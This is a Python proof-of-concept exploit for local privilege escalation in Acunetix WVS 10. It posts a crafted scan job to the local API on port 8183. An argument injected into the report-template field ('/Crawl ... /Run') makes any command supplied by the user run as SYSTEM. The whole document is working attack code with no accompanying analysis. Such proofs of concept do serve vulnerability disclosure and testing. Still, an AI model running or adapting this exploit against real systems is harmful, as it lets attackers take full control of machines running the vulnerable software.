import httplib
import json
from datetime import datetime
import sys
from time import gmtime, strftime
 
COMMAND = sys.argv[1] if len(sys.argv) > 1 else "cmd.exe"
ACUHOST = '127.0.0.1'
ACUPORT = 8183
ACUHEADERS = {
 "Content-Type": "application/json; charset=UTF-8",
 "X-Requested-With": "XMLHttpRequest",
 "Accept": "application/json, text/javascript, */*; q=0.01",
 "RequestValidated": "true"
 }

ACUEXPLOIT = "/Crawl http://www.vpgame.it /Run \""+ COMMAND + "\""
ACUDATA = {"scanType":"scan",
 "targetList":"",
 "target":["http://"+"A"*2048],
 "recurse":"-1",
 "date":strftime("%m/%d/%Y", gmtime()),
 "dayOfWeek":"1",
 "dayOfMonth":"1",
 "time": "%s:%s" % (datetime.now().hour, datetime.now().minute+1),
 "deleteAfterCompletion":"False",
 "params":{"profile":"Default",
 "loginSeq":"<none>",
 "settings":"Default",
 "scanningmode":"heuristic",
 "excludedhours":"<none>",
 "savetodatabase":"True",
 "savelogs":"False",
 "generatereport":"False",
 "reportformat":"PDF",
 "reporttemplate":"WVSDeveloperReport.rep " + ACUEXPLOIT,
 "emailaddress":""}
 }
 
def sendExploit():
    conn = httplib.HTTPConnection(ACUHOST, ACUPORT)
    conn.request("POST", "/api/addScan", json.dumps(ACUDATA), ACUHEADERS)
    resp = conn.getresponse()
    return "%s %s" % (resp.status, resp.reason)
 
print "Acunetix Wvs 10 Local priviledge escalation by Daniele Linguaglossa\n"
print "[+] Command : %s will be executed as SYSTEM" % COMMAND
print "[+] Sending exploit..."
print "[+] Result: " + sendExploit()
print "[+] Done!"
